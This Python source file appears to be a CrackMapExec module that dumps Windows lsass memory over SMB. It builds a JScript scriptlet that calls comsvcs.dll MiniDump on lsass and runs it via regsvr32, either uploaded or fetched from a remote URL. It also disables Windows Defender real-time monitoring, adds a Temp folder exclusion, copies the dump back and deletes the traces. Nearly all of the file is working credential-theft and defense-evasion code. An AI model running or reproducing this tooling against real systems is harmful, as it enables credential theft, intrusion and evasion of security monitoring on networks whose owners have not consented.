import re
import sys
import os
from time import sleep
from pypykatz.pypykatz import pypykatz
import requests

from cme.helpers.bloodhound import add_user_bh


class CMEModule:
    name = "regsvr32"
    description = "Get lsass dump using regsvr32 and parse the result with pypykatz"
    supported_protocols = ["smb"]
    opsec_safe = True  # trust me
    multiple_hosts = True

    def options(self, context, module_options):
        """
        FILELESS             Use fileless mode (default: False): this option doesnot need exactly value, give it any thing; the code will turn fileless mode on and URL is mandatory
        URL                  Host a HTTP server in the current directory using python3 -m http.server 80 (Only needed if Fileless is True); copy the EXACT url served by the module
        """
        #please check, if you are making changes to this code you might break this modeule
        self.tmp_dir = "C:\\Windows\\Temp\\"
        self.share = "C$"
        self.tmp_share = self.tmp_dir.split(":")[1]
        self.sct_file = "host.sct"
        self.file_dump_name="host.dmp"
        self.sct_cwd = os.getcwd()+"/"
        self.sct_file_path = self.sct_cwd
        self.dir_result = self.sct_file_path
        self.fileless = False
        self.url = None
        self.useembeded = True
        self.script=""

        # checking if fileless is true and url is provided

        if 'FILELESS' in module_options and 'URL' in module_options:
            self.fileless = True
            self.url = module_options['URL']

            try:
                response = requests.get(self.url,timeout=10)

                if response.status_code != 200:
                    context.log.error('URL is not reachable!')
                    sys.exit(1)

            except Exception as e:
                context.log.error("Error connecting to URL: {}".format(e))
                sys.exit(1)
            
            

        elif 'FILELESS' in module_options and 'URL' not in module_options:
            context.log.error('URL option is required if FILELESS is True!')
            sys.exit(1)          
            

    

    # this is the main function that will be called by cme to execut the module

    def on_admin_login(self, context, connection):

        if self.useembeded == True:
            command = 'tasklist /v /fo csv | findstr /i "lsass"'
            #context.log.display("Getting lsass PID {}".format(command))
            p = connection.execute(command, True)
            print(p)
            

            self.sct_file_path=self.sct_cwd+'sct_folder/'

            if not os.path.exists(self.sct_file_path):
                os.makedirs("sct_folder")
            else:
                print("Folder exist")
            
            self.sct_file=connection.hostname+".sct"
            self.file_dump_name=connection.hostname+".dmp"

            pid = p.split(",")[1][1:-1]
            script="<?XML version='1.0'?><scriptlet><registration progid='Trusted Publisher'><script language='JScript'><![CDATA[var r = new ActiveXObject('WScript.Shell').Run('cmd /c Powershell -c rundll32.exe C:\\\\Windows\\\\System32\\\\comsvcs.dll, MiniDump " +pid+" "+"C:\\\\Windows\\\\Temp\\\\"+connection.hostname+".dmp"+" full');]]></script></registration></scriptlet>"
            self.script=script
            with open(self.sct_file_path+connection.hostname+".sct", "wb") as procdump:
                procdump.write(script.encode('utf-8'))
            
           
        #context.log.display("Copy {} to {}".format(self.sct_file_path + self.sct_file, self.tmp_dir)) ## this just a console output touch at the end.
    
        try:
            command='Powershell -c Add-MpPreference -ExclusionPath C:\\Windows\\Temp\\'
            p = connection.execute(command, True)
            command='Powershell -c Set-MpPreference -DisableRealtimeMonitoring 1'
            p = connection.execute(command, False)
            context.log.success("Realtime monitoring is disabled")
            sleep(2)
            context.log.success("Added C:\\Windows\\Temp\\ to Windows Defender exclusion list") 
        except Exception as e:
            context.log.fail("Error adding C:\\Windows\\Temp\\ to Windows Defender exclusion list: {}".format(e))

        with open(self.sct_file_path+connection.hostname+".sct", "rb") as procdump:
            if self.fileless == True:
                try:
                    context.log.success("Executing the sct file on the target using fileless mode")
                    context.log.success(self.url+"sct_folder/"+connection.hostname+".sct")
                    p = connection.execute('regsvr32.exe /s /n /u /i:' +self.url+'sct_folder/'+connection.hostname+".sct"+ " scrobj.dll & cmd /c timeout /t 2 & cmd /c copy C:\\Windows\\Temp\\"+connection.hostname+".dmp"+" C:\\Windows\\Temp\\lsass2.dmp", True)
                except Exception as e:
                    print('Error writing file to share {self.share}: {e}')
                    #context.log.fail(f"Error writing file to share {self.share}: {e}") ## this just a console output touch at the end.
            else:
                try:
                    connection.conn.putFile(self.share, self.tmp_share + connection.hostname+".sct", procdump.read) # reading the sct file and putting it on the share
                    context.log.success("Uploaded SCT file {} on the \\\\{}{}".format(connection.hostname+".sct", self.share, self.tmp_share)) ## this just a console output touch at the end.
                    command = 'regsvr32.exe /s /u /i:' +"C:\\\\"+ self.tmp_share + connection.hostname+".sct" + " scrobj.dll & cmd /c timeout /t 2 & cmd /c copy C:\\Windows\\Temp\\"+connection.hostname+".dmp"+" C:\\Windows\\Temp\\lsass2.dmp" # buidling the regsvr32 command
                    p = connection.execute(command, True)
                    print(command)
                    print(p)
                except Exception as e:
                    print('Error writing file to share:'+ e)
                    
                
        context.log.debug(p)  ## this just a console output touch at the end.
       
        

        dump = False  ## statically setting dump to false to change it later.

        if "1 file(s) copied" in p:
            context.log.success("Process lsass.exe was successfully dumped") ## this just a console output touch at the end.
            dump = True
        elif 'The system cannot find the file specified' in p:
            context.log.success("Dump Failed might be due to defender or antivirus")
            
            
            #context.log.fail("Process lsass.exe error un dump, try with verbose") ## this just a console output touch at the end.

        if dump:
            regex = r"([A-Za-z0-9-]*.dmp)"
            matches = re.search(regex, self.file_dump_name, re.MULTILINE) ## searching for the dmp file name

            machine_name = "" ## statically setting machine_name to empty string to change it later. # made redundant with the new code

            if matches:
                machine_name = matches.group() ## setting machine_name to the dmp file name # made redundant with the new code
                context.log.success("Dump the lsass to : "+ connection.hostname+".dmp")
                
            else:
                #context.log.display("Error getting the lsass.dmp file name") ## this just a console output touch at the end.
                #remove_whitelisting=connection.execute('Powershell -c Remove-MpPreference -ExclusionPath C:\\Windows\\Temp\\', True)
                print("Error getting the lsass.dmp file name")
                sys.exit(1)

            #context.log.display("Copy {} to host".format(machine_name)) ## this just a console output touch at the end.

            with open(self.dir_result + connection.hostname+".dmp", "wb+") as dump_file:
                try:
                    connection.conn.getFile(self.share, "\\Windows\\Temp\\" + connection.hostname+".dmp", dump_file.write)
                    context.log.success("Dumpfile of lsass.exe was transferred to {}".format(self.dir_result + connection.hostname+".dmp"))
                except Exception as e:
                    context.log.fail("Error while get file: {}".format(e))

            if self.fileless == False:
                try:
                    connection.conn.deleteFile(self.share, self.tmp_share + connection.hostname+".sct")
                    context.log.success("Deleted the sct file on {} share".format(self.share))
                except Exception as e:
                    context.log.fail("Error deleting sct file on share {}: {}".format(self.share, e))



            try:
                connection.conn.deleteFile(self.share, self.tmp_share + connection.hostname+".dmp")
                connection.conn.deleteFile(self.share, self.tmp_share + "lsass2.dmp")
                context.log.success("Deleted lsass.dmp file on the {} share".format(self.share))
            except Exception as e:
                context.log.fail("Error deleting lsass.dmp file on share {}: {}".format(self.share, e))
            
            try:
                remove_whitelisting=connection.execute('Powershell -c Remove-MpPreference -ExclusionPath C:\\Windows\\Temp\\', True)
                connection.execute('Powershell -c Set-MpPreference -DisableRealtimeMonitoring 0', True)
                context.log.success("Realtime monitoring is enabled again")
                context.log.success("Removed C:\\Windows\\Temp\\ from Windows Defender exclusion list")
                
            except Exception as e:
                context.log.fail("Error deleting procdump file on share {}: {}".format(self.share, e))

    


    



  

            